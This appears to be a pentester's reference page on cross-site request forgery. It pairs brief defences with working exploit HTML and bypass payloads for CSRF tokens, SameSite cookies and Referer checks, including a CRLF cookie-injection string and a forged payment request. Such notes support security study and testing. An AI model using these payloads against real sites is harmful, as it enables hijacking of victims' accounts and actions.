# CSRF

## <mark style="color:purple;">**Exploit**</mark>

**With POST**

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**With GET**

```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

## <mark style="color:purple;">Defences</mark>

<details>

<summary>CSRF tokens</summary>

A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

</details>

<details>

<summary>SameSite cookies</summary>

Controls whether or not a cookie is sent with cross-site requests

If the website doesn't explicitly set a `SameSite` attribute, Chrome automatically applies `Lax` restrictions by default.

* `Strict` Means that the browser sends the cookie only for same-site requests

-   `Lax` Means that browser sends the cookie in cross-site requests, if:

    * The request uses the `GET` method.
    * The request resulted from a top-level navigation by the user, such as clicking on a link.

    The cookie is not sent on cross-site requests, such as on requests to load images or frames.
- `None` Means that the browser sends the cookie with both cross-site and same-site requests. The `Secure` attribute must also be set when setting this value, like so `SameSite=None; Secure`

</details>

<details>

<summary>Referer-based validation</summary>

Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain

</details>

## <mark style="color:purple;">CSRF tokens bypass</mark>

* Switch from `POST` to the `GET` method
* Remove the parameter containing the token
* Invent a token in the required format (the app doesn't keep valid server-side tokens).
* Log in to the application with your account, obtain a valid token, and then feed that token to the victim user in their CSRF attack  (some apps don't validate if the token belongs to the same session as the requesting user).
*   Are there two token: one in a cookie and one in hidden input? (this can also have the same value)

    * Some apps do tie the CSRF token to a cookie, but not to the session cookie.
    * Can you set a cookie? E.g. Header injection with `CRLF`.(`%0d%0a`)
    * ```
      /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
      ```
    * Log in to the application with your account -> obtain a valid token and associated cookie.
    * Generate CSRF PoC and remove the auto-submit `<script>` block. Then add the following code to inject the cookie.

    ```html
    <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
    ```

## <mark style="color:purple;">SameSite cookies bypass</mark>

### <mark style="color:purple;">Lax bypass</mark>

* Using GET requests (bypass lax)

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

* GET method override (bypass lax)
  * Even if an ordinary `GET` request isn't allowed, some frameworks supports `_method` parameter. (Other frameworks support a variety of similar parameters)
  * ```http
    GET /my-account/change-email?email=a@a.com&_method=POST HTTP/1.1
    ```

### <mark style="color:purple;">Strict bypass</mark>

Bypass via client-side redirect. Consider a page `https://vulnerable-website.com/post/confirm?postId=10` that load this script.

```javascript
redirectOnConfirmation = () => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = '/post/' + postId;
    }, 3000);
}
```

```html
<script>
    document.location = "https://vulnerable-website.com/post/confirm?postId=10/../../my-account/change-email?email=a@a.com";
</script>
```

{% hint style="info" %}
**Note**: this attack isn't possible with server-side redirects, as browsers recognize the cross-site request and apply cookie restrictions.
{% endhint %}

## <mark style="color:purple;">Referer-based validation bypass</mark>

* Some apps validate the Referer header if present, but skip if omitted

```html
<meta name="referrer" content="never">
```

* Validation of Referer can be circumvented
  * ```
    http://vulnerable-website.com.attacker-website.com/csrf-attack
    http://attacker-website.com/csrf-attack?vulnerable-website.com
    http://attacker-website.com/vulnerable-website.com
    ```
  * To sed referer you need to add `Referrer-Policy: unsafe-url`. One way to set it in html: `<meta name="referrer" content="unsafe-url"/>`

{% hint style="success" %}
**Tip**: Instead of use `http://attacker-website.com/vulnerable-website.com`, you can use `http://attacker-website.com/` and add `<script>history.pushState('', '', '/vulnerable-website.com')</script>`

<pre class="language-html"><code class="lang-html">&#x3C;!-- http://attacker-website.com/ -->
<strong>&#x3C;html>
</strong>  &#x3C;meta name="referrer" content="unsafe-url"/>
  &#x3C;body>
    &#x3C;form action="https://vulnerable-website.com/change-email" method="POST">
      &#x3C;input type="hidden" name="email" value="test@test.com" />
      &#x3C;input type="submit" value="Submit request" />
    &#x3C;/form>
    &#x3C;script>
      history.pushState('', '', '/vulnerable-website.com');
      document.forms[0].submit();
    &#x3C;/script>
  &#x3C;/body>
&#x3C;/html>
</code></pre>
{% endhint %}

Firefox 87 new default Referrer Policy `strict-origin-when-cross-origin` trimming user sensitive information like path and query string to protect privacy. ([https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/](https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/))